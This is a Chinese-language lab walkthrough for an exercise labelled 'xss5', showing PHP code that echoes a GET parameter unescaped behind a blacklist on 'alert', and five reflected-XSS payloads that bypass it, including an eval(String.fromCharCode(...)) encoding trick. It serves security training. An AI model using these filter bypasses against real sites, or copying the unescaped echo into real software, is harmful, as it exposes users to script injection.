# xss5

进入example5.php

源码
```php
if (preg_match('/alert/i', $_GET['name'])){
    die('error');
}
<?php echo $_GET['name'];?>
```

这一次就直接把alert拉进黑名单了
不过只是对alert拉黑名单而已
还可以使用很多的函数进行执行

```javascript
document.write
console.log
confirm
prompt
```
payload1
```js
example5.php?name=<script>document.write('hello xss')</script>
```
![img](../../../image/xss/69601158270.png)

payloade2
```js
example5.php?name=<script>console.log('hello xss')</script>
```
![img](../../../image/xss/2365403153406.png)
![img](../../../image/xss/5032603140086.png)

payload3
```js
example5.php?name=<script>confirm('hello xss')</script>
```
![img](../../../image/xss/3945705130616.png)

payload4
```js
example5.php?name=<script>prompt('hello xss')</script>
```
![img](../../../image/xss/59107133120.png)

这些都是可以进行注入的

还有一种解法是对alert进行编码String.fromCharCode编码，
在hackbar里很容易的去编码

![img](../../../image/xss/1957212142067.png)
编码之后得到
```js
String.fromCharCode(97,108,101,114,116,40,39,104,101,108,108,111,32,120,115,115,39,41)
```
然后使用[eval](https://m.runoob.com/jsref/jsref-eval.html)进行执行
payload5
```js
example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,104,101,108,108,111,32,120,115,115,39,41))</script>
```
![img](../../../image/xss/4203915134952.png)

过关~~